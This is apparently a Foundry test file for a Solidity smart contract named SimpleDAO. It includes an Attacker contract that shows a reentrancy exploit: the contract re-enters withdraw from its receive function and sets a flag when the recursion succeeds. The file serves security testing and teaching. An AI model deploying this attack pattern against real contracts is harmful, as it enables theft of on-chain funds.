
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleDAO} from "../src/SimpleDAO.sol";

contract TestReentrancySimpleDAO is Test {
    SimpleDAO public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new SimpleDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1000 && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific pre-condition state required other than funding.

        // --- 3. Funding ---
        // A. Fund the Victim
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    SimpleDAO public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = SimpleDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit funds to establish credit
        _victim.donate{value: val}(address(this));
    }

    function attack(uint256 val) public {
        // We split the withdrawal to demonstrate reentrancy.
        // Since Solidity 0.8.x protects against underflow, we cannot drain more than deposited
        // without reverting, but we can prove the control flow hijack by calling withdraw recursively.
        storedAttackVal = val / 2;

        // 3. Call the vulnerable function.
        _victim.withdraw(storedAttackVal);

        // 4. Verify Success Conditions.
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            _victim.withdraw(storedAttackVal);
        }
    }
}
